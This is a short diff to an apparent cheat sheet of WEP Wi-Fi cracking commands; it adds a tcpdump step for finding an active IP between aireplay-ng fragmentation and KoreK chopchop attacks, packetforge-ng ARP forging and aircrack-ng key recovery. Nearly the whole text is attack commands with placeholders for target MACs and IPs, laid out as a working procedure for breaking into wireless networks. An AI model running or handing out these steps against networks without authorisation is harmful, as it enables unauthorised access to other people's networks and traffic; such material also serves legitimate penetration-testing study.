@@ -112,6 +112,9 @@ aireplay-ng -1 6000 -e <ESSID> -a <AP MAC> -h <wlan0 MAC> wlan0
 ##Option 1: fragmentation attack until 150,000 bytes 
 aireplay-ng -5 -b <AP MAC> -h <wlan0 MAC> wlan0
 
+#find an active IP in the network
+tcpdump -s 0 -n -e -r replay_*.cap
+
 #create arp request packet
 packetforge-ng -0 -a <AP MAC> -h <wlan0 MAC> -k <Dest IP/Local Broadcast IP> -l <Source IP> -y <xor file> -w <output file>
 
@@ -123,6 +126,9 @@ aircrack-ng -0 <capture file .cap>
  
 #Option 2: KoreK ChopChop (tends to work when frag attack does not, but takes longer) 
 aireplay-ng -4 -b <AP MAC> -h <wlan0 MAC> wlan0
+
+#find an active IP in the network
+tcpdump -s 0 -n -e -r replay_*.cap
 
 #create arp request packet
 packetforge-ng -0 -a <AP MAC> -h <wlan0 MAC> -k <Dest IP/Local Broadcast IP> -l <Source IP found in KoreK attack> -y <xor file> -w <output file>
